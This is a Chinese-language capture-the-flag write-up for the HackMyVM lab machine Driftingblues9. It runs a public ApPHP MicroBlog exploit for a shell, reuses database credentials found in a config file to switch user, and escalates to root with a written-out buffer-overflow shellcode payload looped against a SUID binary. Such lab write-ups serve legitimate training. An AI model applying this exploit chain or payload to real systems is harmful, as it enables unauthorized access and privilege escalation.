# Driftingblues9

2024-12-28 https://hackmyvm.eu/machines/machine.php?vm=Driftingblues9

## IP

192.168.5.40

## Scan

```
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
57687/tcp open  unknown
```

访问 80 web，源码中发现：This script was generated by ApPHP MicroBlog v.1.0.1 (http://www.apphp.com/php-microblog/) 有个登陆页面，尝试简单密码登陆，没有成功。

searchsploit ApPHP MicroBlog v.1.0.1 发现有一些漏洞，进行利用：

```
python2 33070.py http://192.168.5.40/index.php
```

执行后得到了执行 shell 的环境，开始寻找 flag。发现有一个用户 clapton，但是没有权限进入。

发现 web 的数据库配置信息：

```
define('DATABASE_HOST', 'localhost');	        // Database host
define('DATABASE_NAME', 'microblog');	        // Name of the database to be used
define('DATABASE_USERNAME', 'clapton');	        // User name for access to database
define('DATABASE_PASSWORD', 'yaraklitepe');	    // Password for access to database
define('DB_ENCRYPT_KEY', 'p52plaiqb8');		    // Database encryption key
define('DB_PREFIX', 'mb101_');		            // Unique prefix of all table names in the database
```

发现数据库的用户名也是 clapton，可能存在密码复用的情况，尝试 su 切换到 clapton 用户，输入密码 yaraklitepe，切换成功。

在 home 目录拿到 user flag：

```
clapton@debian:~$ cat user.txt
F569AA95FAFF65E7A290AB9ED031E04F
```

寻找提权至 root 的路径, 发现 note.txt 提示：

```
clapton@debian:~$ cat note.txt
buffer overflow is the way. ( ͡° ͜ʖ ͡°)

if you're new on 32bit bof then check these:

https://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html
https://samsclass.info/127/proj/lbuf1.htm
```

同时发现 root 的 suid 程序 input，根据提示应该存在缓冲区溢出漏洞，经过尝试，形成利用的 payload：

```
for i in {1..10000}; do (./input $(python -c 'print("A" * 171 + "\xe0\x13\x8b\xbf" + "\x90"* 1000 + "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80")')); done
```

最终得到 root 权限：

```
# cat root.txt

this is the final of driftingblues series. i hope you've learned something from them.

you can always contact me at vault13_escape_service[at]outlook.com for your questions. (mail language: english/turkish)

your root flag:

04D4C1BEC659F1AA15B7AE731CEEDD65

good luck. ( ͡° ͜ʖ ͡°)
```
